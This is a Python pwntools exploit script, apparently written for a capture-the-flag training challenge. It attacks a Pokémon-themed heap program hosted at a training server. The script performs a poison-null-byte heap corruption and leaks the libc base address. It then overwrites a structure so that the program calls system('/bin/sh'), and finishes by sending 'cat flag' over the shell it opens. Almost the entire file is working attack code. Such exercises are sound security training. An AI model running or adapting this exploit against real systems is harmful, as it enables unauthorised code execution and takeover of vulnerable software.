from pwn import *
import time
import subprocess


#transforms an integer to bytes with the minimum number of bytes possible
def int2bytes(num: int, adjust=8) -> bytes:
    return num.to_bytes((num.bit_length() + 7) // 8, byteorder='little', signed=True if num < 0 else False).ljust(adjust, b"\x00")

# this function checks if the input is any of: str, int or bytes and returns the bytes conversion
# otherwise it raises an exception
# (if input is bytes they are return unchanged)
def any2bytes(datum):
    if isinstance(datum, str):
        return datum.encode()
    elif isinstance(datum, int):
        return int2bytes(datum)
    elif isinstance(datum, bytes):
        return datum
    else:
        raise TypeError("any2bytes: datum provided is neither str, int or bytes object")

# converts data to bytes and send
# data can also be an array
def send(r, data):
    result=b""
    if isinstance(data, list):
        for datum in data:
            result += any2bytes(datum)
    else:
        result = any2bytes(data)
    r.sendline(result)
    time.sleep(0.05)


def print_red(str):
    print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
    command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
    try:
        return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
    except (subprocess.CalledProcessError, ValueError) as e:
        print(f"An exception occurred: {e}")
        exit(-1)

def rop_chain(chain):     
    for i in range(len(chain)):
        chain[i] = p64(chain[i])
    return reduce(lambda x, y: x + y, chain)


#I/O functions
def add_pkm(r):
    #r.clean()
    send(r, b"0")


def rename_pkm(r, index, data, length):
    #r.clean()
    send(r, b"1")
    r.recvuntil(b"> ")
    send(r, str(index).encode())
    r.recvuntil(b"length: ")
    send(r, str(length).encode())
    send(r, data)

def kill_pkm(r, index):
    #r.clean()
    send(r, b"2")
    #r.clean()
    send(r, str(index).encode())


#this function takes the leak of libc
#it assumes POISON NULL BYTE ATTACK has already been made
def get_leak(r):
    #r.clean()
    send(r, b"4")
    #r.clean()
    send(r, b"3")
    r.recvuntil(b" *Name: ")
    return u64(r.recvline(keepends=False).ljust(8, b"\x00"))

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "warn"
logging.getLogger('pwnlib.elf').setLevel(logging.ERROR)

# breakpoints

one_gadget=0x00
if args["ONE_GADGET"]:
    one_gadget = int(args["ONE_GADGET"], 16)

if args["REMOTE"]:
    r = remote("bin.training.offdef.it", 2025)
else:
    r = process("././pkm_nopie.mod")
    if args["GDB"]:
        gdb.attach(r, f"""
            unset env
            set disable-randomization off
            set debuginfod enabled on
            c
            """)
        input("wait")
#gadgets
text_pop_rdi = 0x401db3

#address
UNKNOWN = 0x402036

LIBC = ELF("./libc-2.27_notcache.so")

# NULL BYTE POISONING ATTACK
time.sleep(0.3)
add_pkm(r)                                      #PKM1
add_pkm(r)                                      #PKM2
add_pkm(r)                                      #PKM3
rename_pkm(r, 0, ["a"*0x28], 0x28)                #NAME1
rename_pkm(r, 1, ["b"*0x2f0, p64(0x300), "b"*0x60], 0x358)              #NAME2
rename_pkm(r, 2, ["c"*0x100], 0x108)              #NAME3 <- last byte must be 0 cause you go overwrite last byte (so also PREV_INUSE) of TOP_CHUNK
kill_pkm(r, 1)                                  #FREE B <- when I try to free it checks all the heap in order coalescing temptative and there notice that TOP_CHUNK last byte has changed
rename_pkm(r, 0, ["a"*0x28], 0x28)                #OVERFLOW NULL BYTE
add_pkm(r)                                      #PKM1
add_pkm(r)                                      #PKM3 -> First allocation on top of dead B: Here there is the check that ensures that im really allocating somewhere valid!
add_pkm(r)                                      #PKM4
kill_pkm(r, 3)
kill_pkm(r, 2)                                  # After A I should see all free, always!

#LEAK
add_pkm(r)                                      #PKM2 -> NAME2
add_pkm(r)                                      #PKM3 -> PKM2
add_pkm(r)                                      #PKM5 -> PKM3
add_pkm(r)                                      #PKM6 -> PKM4
add_pkm(r)                                      #PKM7 -> done for coalasceding
kill_pkm(r, 6)                                  
rename_pkm(r, 3, ["aaaa"], 0xf8)                  #NAME3 -> PKM4
kill_pkm(r, 4)                                  #edits NAME3 with fd
LIBC.address = get_leak(r) - 0x3e2c80
print_red(hex(LIBC.address))

#OVERWRITE
add_pkm(r)                                      #PKM4 -> NAME3
add_pkm(r)                                      #PKM6
rename_pkm(r, 3, [b"/bin/sh\x00", "d"*0x20, p64(UNKNOWN), "a"*0x28, p64(UNKNOWN), p64(LIBC.symbols["system"])], 0xf8) # scrivo tutti gli IV, mi rimane da riempire le mosse

#RCE
send(r, b"3")
send(r, b"4")
send(r, b"0")
send(r, b"3")
send(r, b"cat flag")

r.interactive()
